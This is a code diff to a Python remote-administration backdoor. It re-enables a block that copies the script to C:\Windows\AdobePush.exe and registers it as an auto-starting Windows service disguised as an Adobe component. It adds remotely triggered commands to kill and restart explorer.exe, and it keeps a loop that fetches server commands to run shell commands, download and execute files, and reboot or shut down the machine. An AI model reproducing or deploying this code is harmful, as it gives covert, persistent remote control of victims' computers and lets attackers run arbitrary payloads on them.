@@ -1,12 +1,10 @@
 # -*- coding: utf-8 -*-
 import shutil, sys, os
 
-"""
 if(sys.argv[0] != 'C:\\Windows\\AdobePush.exe'):
 	shutil.copy2(sys.argv[0], 'C:\\Windows\\AdobePush.exe')
 	os.popen('sc create AdobePush binpath= "C:\Windows\AdobePush.exe"')
 	os.popen('sc config AdobePush start= AUTO')
-"""
 
 if(os.path.isfile('D:\\AdobePush.exe')):
 	os.remove('D:\\AdobePush.exe')
@@ -162,6 +160,17 @@ def Downloader2Execute(info):
 	else:
 		return '文件下载失败'
 
+def RebootExplorer(info):
+	ShellExecute(base64.b64encode('taskkill /F /IM explorer'))
+	ShellExecute(base64.b64encode('explorer.exe'))
+	return '执行成功'
+
+def ShutdownExplorer(info):
+	return ShellExecute(base64.b64encode('taskkill /F /IM explorer'))
+
+def StartExplorer(info):
+	return ShellExecute(base64.b64encode('explorer.exe'))
+
 def Reboot(info):
 	info = base64.b64decode(info)
 	os.popen('shutdown /r /t %i' % (int(info) + 10))
@@ -175,17 +184,23 @@ def Shutdown(info):
 while 1:
 	for item in get_commands():
 		if(item['act'] == 'RunCMD'):
-			res = run_cmd(item['tex'])
+			res = RunCMD(item['tex'])
 		elif(item['act'] == 'ShellExecute'):
-			res = shell_execute(item['tex'])
+			res = ShellExecute(item['tex'])
 		elif(item['act'] == 'Downloader'):
-			res = downloader(item['tex'])
+			res = Downloader(item['tex'])
 		elif(item['act'] == 'Downloader2Execute'):
-			res = downloader2execute(item['tex'])
+			res = Downloader2Execute(item['tex'])
+		elif(item['act'] == 'RebootExplorer'):
+			res = RebootExplorer(item['tex'])
+		elif(item['act'] == 'ShutdownExplorer'):
+			res = ShutdownExplorer(item['tex'])
+		elif(item['act'] == 'StartExplorer'):
+			res = StartExplorer(item['tex'])
 		elif(item['act'] == 'Reboot'):
-			res = reboot(item['tex'])
+			res = Reboot(item['tex'])
 		elif(item['act'] == 'Shutdown'):
-			res = shutdown(item['tex'])
+			res = Shutdown(item['tex'])
 		else:
 			pass
 		fin_commands(item['cid'], res)
